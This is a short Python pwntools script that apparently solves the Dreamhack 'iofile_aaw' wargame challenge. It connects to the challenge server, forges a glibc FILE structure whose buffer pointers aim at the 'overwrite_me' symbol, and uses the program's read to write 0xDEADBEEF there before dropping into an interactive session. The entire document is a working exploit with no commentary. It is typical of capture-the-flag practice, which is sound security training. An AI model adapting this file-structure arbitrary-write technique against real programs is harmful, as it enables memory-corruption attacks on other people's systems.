from pwn import *

p = remote("host3.dreamhack.games", 13577)
elf = ELF("./iofile_aaw")
flag_buf = elf.symbols["overwrite_me"]

payload = p64(0xfbad2488)
payload += p64(0) #read_ptr
payload += p64(0) #read_end
payload += p64(0) #read_base
payload += p64(0) #write_ptr
payload += p64(0) #write_end
payload += p64(0) #write_base
payload += p64(flag_buf) #buf_base
payload += p64(flag_buf + 1024) #buf_end

payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) # stdin

p.recvuntil('Data: ')
p.sendline(payload)
p.sendline(p64(0xDEADBEEF) + b"\x00"*1024)
p.interactive()
